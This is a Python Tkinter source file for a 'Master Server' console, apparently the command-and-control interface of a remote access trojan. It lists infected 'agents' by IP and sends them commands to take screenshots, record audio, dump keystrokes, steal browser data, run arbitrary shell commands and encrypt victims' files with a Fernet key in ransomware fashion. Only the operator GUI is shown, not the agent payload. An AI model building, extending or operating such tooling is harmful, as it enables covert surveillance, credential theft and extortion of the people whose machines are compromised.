import sys
import tkinter as tk
from tkinter import ttk, messagebox

# Set colors and styles
TEXT_COLOR = "white"
BG_COLOR = "#222222"
BUTTON_BG_COLOR = "gray"
BUTTON_FG_COLOR = "white"
LABEL_FONT = ("Arial", 14, "bold")
BUTTON_FONT = ("Arial", 10, "bold")


class MasterUI:
    def __init__(self, master, pending_customers):
        self.pending_customers = pending_customers
        self.master = master
        self.output_capture = master.output_capture
        self.connected_ips_label = None
        self.connected_ips_listbox = None
        self.progress_bar = None
        self.heartbeat_label = None
        self.progress_bar_label = None
        self.output_tabs = {}
        self.notebook = None
        self.current_output_tab = ""

        self.screenshot_button = None
        self.audio_button = None
        self.keys_button = None
        self.browsers_button = None
        self.cmd_button = None
        self.info_button = None
        self.encrypt_button = None

    def perform_action(self, agent_pool, command, button_name):
        sys.stdout = self.output_capture
        try:
            selected_item = self.connected_ips_listbox.get(self.connected_ips_listbox.curselection())

            if selected_item:
                print(f"Selected Agent: {selected_item}")
                # Extract the IP and port from the selected item
                try:
                    _, selected_ip, selected_port = selected_item.split(':')
                except ValueError:
                    # Show a warning popup
                    messagebox.showwarning("Warning", "Wait the current Agent finish its job.")
                    return

                selected_port = int(selected_port.split(' -')[0])
                # Perform the desired action for the selected IP and port
                print(f"Agent: ('{selected_ip}', {selected_port}) "
                      f"is being added to the working pool to process command: {command}")
                agent = (selected_ip.strip(), selected_port)
                self.current_output_tab = button_name
                agent_pool.put((agent, selected_ip.strip(), command))
                self.connected_ips_listbox.selection_clear(0, tk.END)  # to clear the selection
                self.toggle_buttons(None)
        except tk.TclError:
            print("No item selected in the listbox.")

    def update_progress_bar(self, progress):
        extra_label = ''
        if progress == 100:
            extra_label = "✅"
        if progress == "error":
            self.progress_bar_label.config(text="❌")
            self.progress_bar_label.update()
        else:
            self.progress_bar["value"] = progress
            self.progress_bar_label.config(text=f"{round(progress)}% {extra_label}")
            self.progress_bar_label.update()

    def open_encryption_window(self, root):
        encryption_window = tk.Toplevel(root)
        encryption_window.title("Files Options")
        encryption_window.configure(bg="#222222")

        # Calculate the position to center the window
        root.update_idletasks()
        root_width = root.winfo_width()
        root_height = root.winfo_height()
        encryption_width = 400
        encryption_height = 250
        x = root.winfo_x() + (root_width - encryption_width) // 2
        y = root.winfo_y() + (root_height - encryption_height) // 2
        encryption_window.geometry(f"{encryption_width}x{encryption_height}+{x}+{y}")

        encryption_label = tk.Label(encryption_window, text="Set a Fernet encryption key below:",
                                    font=("Arial", 12, "bold"), fg="white", bg="#222222")

        encryption_key_entry = tk.Entry(encryption_window, show="*", font=("Arial", 10), width=30)

        # Toggle encryption checkbox
        def toggle_encryption():
            if encrypt_var.get():
                decryption_checkbox.deselect()
                encryption_label.pack_forget()
                encryption_key_entry.pack_forget()

        # Toggle decryption checkbox
        def toggle_decryption():
            if decryption_var.get():
                encrypt_checkbox.deselect()
                encryption_label.pack(pady=10)
                encryption_key_entry.pack(pady=5)
            else:
                encryption_label.pack_forget()
                encryption_key_entry.pack_forget()

        def toggle_save_files():
            if save_files_var.get():
                decryption_checkbox.deselect()
                encryption_label.pack_forget()
                encryption_key_entry.pack_forget()

        checks_frame = tk.Frame(encryption_window, bg="#222222")
        checks_frame.pack(side=tk.TOP, pady=10)

        encrypt_var = tk.BooleanVar()
        encrypt_checkbox = tk.Checkbutton(checks_frame, text="Encrypt", variable=encrypt_var,
                                          font=("Arial", 10), fg="white", bg="#222222", selectcolor="#222222",
                                          command=toggle_encryption)
        encrypt_checkbox.grid(row=0, column=0, padx=5)

        save_files_var = tk.BooleanVar()
        save_files_checkbox = tk.Checkbutton(checks_frame, text="Save files", variable=save_files_var,
                                             font=("Arial", 10), fg="white", bg="#222222", selectcolor="#222222",
                                             command=toggle_save_files)
        save_files_checkbox.grid(row=0, column=1, padx=5)

        decryption_var = tk.BooleanVar()
        decryption_checkbox = tk.Checkbutton(checks_frame, text="Decrypt", variable=decryption_var,
                                             font=("Arial", 10), fg="white", bg="#222222", selectcolor="#222222",
                                             command=toggle_decryption)
        decryption_checkbox.grid(row=0, column=2, padx=5)

        password = ""

        # Function to open the CMD window

        # Execute encryption
        def execute_encryption():
            nonlocal password
            password = encryption_key_entry.get()
            save_files = "True" if save_files_var.get() else "False"
            encryption = "True" if encrypt_var.get() else "False"
            decryption = "True" if decryption_var.get() else "False"
            encryption_window.destroy()
            self.perform_action(self.pending_customers,
                                f"encrypt╚{password}╚{save_files}╚{encryption}╚{decryption}",
                                "Files")

        # Cancel encryption
        def cancel_encryption():
            encryption_window.destroy()

        encryption_frame = tk.Frame(encryption_window, bg="#222222")
        encryption_frame.pack(side=tk.BOTTOM, pady=10)

        ok_button = tk.Button(encryption_frame, text="OK", width=10, font=("Arial", 10, "bold"),
                              command=execute_encryption, bg="gray", fg="white")
        ok_button.pack(side=tk.LEFT, padx=10)

        cancel_button = tk.Button(encryption_frame, text="Cancel", width=10, font=("Arial", 10, "bold"),
                                  command=cancel_encryption, bg="gray", fg="white")
        cancel_button.pack(side=tk.LEFT, padx=10)

        encryption_window.bind('<Return>', lambda event: execute_encryption())

    def open_cmd_window(self, root):
        cmd_window = tk.Toplevel(root)
        cmd_window.title("Please enter a command to be run")
        cmd_window.configure(bg=BG_COLOR)

        # Calculate the position to center the window
        root.update_idletasks()
        root_width = root.winfo_width()
        root_height = root.winfo_height()
        cmd_width = 500
        cmd_height = 300
        x = root.winfo_x() + (root_width - cmd_width) // 2
        y = root.winfo_y() + (root_height - cmd_height) // 2
        cmd_window.geometry(f"{cmd_width}x{cmd_height}+{x}+{y}")

        cmd_text = tk.Text(cmd_window, font=("Arial", 10), fg=TEXT_COLOR, bg=BG_COLOR)
        cmd_text.pack(padx=10, pady=10)
        cmd_text.focus()

        scrollbar = tk.Scrollbar(cmd_window)
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)

        cmd_text.config(yscrollcommand=scrollbar.set)
        scrollbar.config(command=cmd_text.yview)

        # Execute command
        def execute_command():
            command = cmd_text.get("1.0", tk.END).strip()
            self.perform_action(self.pending_customers, f'cmd╚{command}', "Run CMD")
            cmd_window.destroy()

        ok_button = tk.Button(cmd_window, text="OK", width=10, font=("Arial", 10, "bold"), command=execute_command,
                              bg=BUTTON_BG_COLOR, fg=BUTTON_FG_COLOR)
        ok_button.pack(pady=10)
        cmd_window.bind('<Return>', lambda event: execute_command())

    def create_gui(self):

        def on_close():
            # Add your code here to stop executing the script
            root.destroy()  # Close the GUI window

        # Function to switch tabs
        def switch_tab(_):
            current_tab = self.notebook.tab(self.notebook.select(), "text")
            if self.current_output_tab != '':
                self.output_tabs[self.current_output_tab]['output_text'].delete("1.0", tk.END)
                self.output_tabs[self.current_output_tab]['output_text'].insert(tk.END,
                                                                                self.output_tabs[current_tab][
                                                                                    'content'])

        # Create the GUI
        root = tk.Tk()
        root.title("Master Server")
        root.configure(bg="#222222")  # Set the background color to black
        root.protocol("WM_DELETE_WINDOW", on_close)  # Handle the close event

        # Create a frame to hold connected IPs and output text
        frame1 = tk.Frame(root, bg=BG_COLOR)
        frame1.pack(pady=10)

        # Create a label for connected IPs
        self.connected_ips_label = tk.Label(frame1, text="Connected IPs:", font=LABEL_FONT, fg=TEXT_COLOR, bg=BG_COLOR)
        self.connected_ips_label.pack(side=tk.LEFT, padx=120)

        # Create a label for heartbeat text
        self.heartbeat_label = tk.Text(frame1, font=LABEL_FONT, fg=TEXT_COLOR, bg=BG_COLOR, width=1, height=1)
        self.heartbeat_label.pack(side=tk.RIGHT)

        # Create a label for output
        output_label = tk.Label(frame1, text="Output", font=LABEL_FONT, fg=TEXT_COLOR, bg=BG_COLOR)
        output_label.pack(side=tk.RIGHT, padx=300)

        # Create a frame to hold connected IPs, progress bar, and output text
        frame = tk.Frame(root, bg=BG_COLOR)
        frame.pack(pady=10)

        # Create a listbox to display connected IPs
        self.connected_ips_listbox = tk.Listbox(frame, selectmode=tk.SINGLE, font=("Arial", 10), width=52, height=15,
                                                fg=TEXT_COLOR, bg=BG_COLOR, selectbackground=BUTTON_BG_COLOR)
        self.connected_ips_listbox.pack(side=tk.LEFT)

        # Create a scrollbar for the connected IPs listbox
        ips_scrollbar = ttk.Scrollbar(frame)
        ips_scrollbar.pack(side=tk.LEFT, fill=tk.Y)

        # Configure the connected IPs listbox to use the scrollbar
        self.connected_ips_listbox.config(yscrollcommand=ips_scrollbar.set)
        ips_scrollbar.config(command=self.connected_ips_listbox.yview)

        # Create a custom style for the Notebook widget
        notebook_style = ttk.Style()
        notebook_style.configure("CustomNotebook.TNotebook", background=BG_COLOR)

        # Configure the tab style with padding
        notebook_style.configure("CustomNotebook.TNotebook.Tab", padding=5)

        # Create a Notebook widget with the custom style
        self.notebook = ttk.Notebook(frame, style="CustomNotebook.TNotebook")
        self.notebook.pack(side=tk.RIGHT, padx=(50, 0))

        tabs = ['Take Screenshot', 'Record Audio', 'Dump Keys', 'Browsers Data', 'Run CMD', 'System Info', 'Files']

        # Create three tabs with random names
        i = 0
        for tab in tabs:
            output = 'No output.'
            tab_frame = tk.Frame(self.notebook, bg=BG_COLOR)
            output_text = tk.Text(tab_frame, font=("Arial", 10), width=90, height=15, fg=TEXT_COLOR, bg=BG_COLOR)

            output_scrollbar = ttk.Scrollbar(tab_frame, command=output_text.yview)
            output_scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
            output_text.pack(fill=tk.BOTH, expand=True)
            output_text.insert(tk.END, output)
            output_text.config(yscrollcommand=output_scrollbar.set)
            tab_name = f"{tab}"
            tab_data = {'content': 'No output.',
                        'output_text': output_text,
                        'index': i}
            self.output_tabs[tab_name] = tab_data
            self.notebook.add(tab_frame, text=tab_name)
            i += 1

        # Bind the tab change event to switch the output text
        self.notebook.bind("<<NotebookTabChanged>>", switch_tab)

        # Create a frame to hold the progress bar and label
        frame3 = tk.Frame(root, bg=BG_COLOR)
        frame3.pack(pady=10, padx=(470, 0))

        # Create the progress bar
        self.progress_bar = ttk.Progressbar(frame3, orient="horizontal", length=600, maximum=100, mode="determinate")
        self.progress_bar.pack(side=tk.LEFT)  # Align progress bar to the left side (west)

        # Create the label for progress text
        self.progress_bar_label = tk.Label(frame3, text="0%", width=6, bg=BG_COLOR, fg="white")
        self.progress_bar_label.pack(padx=10, side=tk.RIGHT)

        # Create a frame to hold the buttons at the bottom
        button_frame = tk.Frame(root, bg=BG_COLOR)
        button_frame.pack(side=tk.BOTTOM, padx=50)

        # Update button styles for dark mode
        button_style = {"font": BUTTON_FONT, "bg": BUTTON_BG_COLOR, "fg": BUTTON_FG_COLOR}

        # Screenshot button
        self.screenshot_button = tk.Button(button_frame, text="Take Screenshot", width=15, height=2,
                                           command=lambda: self.perform_action(self.pending_customers,
                                                                               "screenshot",
                                                                               "Take Screenshot"),
                                           state=tk.DISABLED, **button_style)
        self.screenshot_button.pack(side=tk.LEFT, padx=5, pady=10)

        # Audio button
        self.audio_button = tk.Button(button_frame, text="Record Audio", width=15, height=2,
                                      command=lambda: self.perform_action(self.pending_customers,
                                                                          "audio",
                                                                          "Record Audio"),
                                      state=tk.DISABLED, **button_style)
        self.audio_button.pack(side=tk.LEFT, padx=5, pady=10)

        # Keys button
        self.keys_button = tk.Button(button_frame, text="Dump Keys", width=15, height=2,
                                     command=lambda: self.perform_action(self.pending_customers,
                                                                         "keys",
                                                                         "Dump Keys"),
                                     state=tk.DISABLED, **button_style)
        self.keys_button.pack(side=tk.LEFT, padx=5, pady=10)

        # Browsers button
        self.browsers_button = tk.Button(button_frame, text="Browsers Data", width=15, height=2,
                                         command=lambda: self.perform_action(self.pending_customers,
                                                                             "browsers",
                                                                             "Browsers Data"),
                                         state=tk.DISABLED, **button_style)
        self.browsers_button.pack(side=tk.LEFT, padx=5, pady=10)

        # CMD button
        self.cmd_button = tk.Button(button_frame, text="Run CMD", width=15, height=2,
                                    command=lambda: self.open_cmd_window(root),
                                    state=tk.DISABLED, **button_style)
        self.cmd_button.pack(side=tk.LEFT, padx=5, pady=10)

        # Info button
        self.info_button = tk.Button(button_frame, text="System Info", width=15, height=2,
                                     command=lambda: self.perform_action(self.pending_customers,
                                                                         "info",
                                                                         "System Info"),
                                     state=tk.DISABLED, **button_style)
        self.info_button.pack(side=tk.LEFT, padx=5, pady=10)

        # Encrypt button
        self.encrypt_button = tk.Button(button_frame, text="Files", width=15, height=2,
                                        command=lambda: self.open_encryption_window(root),
                                        state=tk.DISABLED, **button_style)
        self.encrypt_button.pack(side=tk.LEFT, padx=5, pady=10)

        # Function to open the encryption window

        self.connected_ips_listbox.bind('<<ListboxSelect>>', self.toggle_buttons)

        # Start the GUI main loop
        root.mainloop()

    def toggle_buttons(self, _):
        connected_indices = self.connected_ips_listbox.curselection()

        if connected_indices:
            selected_item = self.connected_ips_listbox.get(connected_indices[0]).lower()

            # Buttons state change depending on the selected IP's mode
            state_general = tk.NORMAL if selected_item != "limited" else tk.DISABLED
            state_screenshot = tk.DISABLED if "limited" in selected_item else tk.NORMAL

            self.screenshot_button.config(state=state_general)
            self.audio_button.config(state=state_general)
            self.keys_button.config(state=state_general)
            self.browsers_button.config(state=state_general)
            self.cmd_button.config(state=state_general)
            self.info_button.config(state=state_general)
            self.encrypt_button.config(state=state_general)
        else:
            # If no selection, all buttons become DISABLED
            state_default = tk.DISABLED
            self.screenshot_button.config(state=state_default)
            self.audio_button.config(state=state_default)
            self.keys_button.config(state=state_default)
            self.browsers_button.config(state=state_default)
            self.cmd_button.config(state=state_default)
            self.info_button.config(state=state_default)
            self.encrypt_button.config(state=state_default)

    @staticmethod
    def update_connection_label(label, count):
        label.config(text=f"Connected IPs: {len(count)}")
        label.update()

    def update_connected_ips_listbox(self, agent_pool, ip, message, action="add", command=""):
        try:
            items = self.connected_ips_listbox.get(0, tk.END)
            ip_text = f"Agent {len(agent_pool)}: {ip[0]}:{ip[1]} - {message}"

            command_agent = command

            if "cmd" in command_agent:
                command_agent = "cmd"
            if "encrypt" in command_agent:
                command_agent = "encrypt"

            if command_agent:
                ip_text += f" - working on: {command_agent}"
            else:
                ip_text += " - connected"

            if action == "update" or action == "remove":
                self.update_or_remove_item(items, ip, action, command_agent, agent_pool, command)
            elif action == "add":
                self.add_item_if_not_exists(items, ip_text, ip)

            self.update_connection_label(self.connected_ips_label, agent_pool)
        except Exception as e:
            print(f"Error removing IP, maybe it doesn't exist: {e}")

    def update_or_remove_item(self, items, ip, action, command_agent, agent_pool, command):
        for index, item in enumerate(items):
            if f"{ip[0]}:{ip[1]}" in item:
                if action == "update":
                    self.update_item(item, index, command_agent, ip, command)
                elif action == "remove":
                    self.remove_item(index, ip, agent_pool)
                break

    def add_item_if_not_exists(self, items, ip_text, ip):
        if not any(f"{ip[0]}:{ip[1]}" in item for item in items):
            self.connected_ips_listbox.insert(tk.END, ip_text)
            print(f"Agent: ('{ip[0]}', {ip[1]}) was added to the pool.")

    def update_item(self, item, index, command_agent, ip, command):
        current_command = item.split(" - ")[-1].split(":")[-1].strip()
        # Update the item with the new command
        if current_command != "connected":
            new_item = item.replace(f"working on: {current_command}", f"{command_agent}")
        else:
            new_item = item.replace("connected", f"working on: {command_agent}")

        self.connected_ips_listbox.delete(index)
        self.connected_ips_listbox.insert(index, new_item)
        if command != "connected":
            print(f"Agent: ('{ip[0]}', {ip[1]}) is processing command: {command}")

    def remove_item(self, index, ip, agent_pool):
        self.connected_ips_listbox.delete(index)
        for agent in agent_pool:
            if agent['addr_agent'] == ip:
                agent_pool.remove(agent)
                print(f"Agent: ('{ip[0]}', {ip[1]}) was removed from agent_pool")
                break
        print(f"Agent: ('{ip[0]}', {ip[1]}) was deleted from list.")

    def update_and_display_output_tab(self):
        """
        Update and display the output tab.

        Returns:
            None
        """
        captured_output = self.output_capture.output
        output_string = ''.join(captured_output)

        self.output_tabs[self.current_output_tab]['content'] = (self.output_tabs[self.current_output_tab]['content'] +
                                                                "\n\n~~~~~~~~~~~~~~~~~~~NEW OUTPUT~~~~~~~~~~~~~~~\n\n" +
                                                                output_string)

        self.notebook.select(self.output_tabs[self.current_output_tab]['index'])

        self.output_tabs[self.current_output_tab]['output_text'].delete("1.0", tk.END)
        self.output_capture.__init__()
        self.output_tabs[self.current_output_tab]['output_text'].insert("1.0",
                                                                        self.output_tabs[self.current_output_tab][
                                                                            'content'], "info")
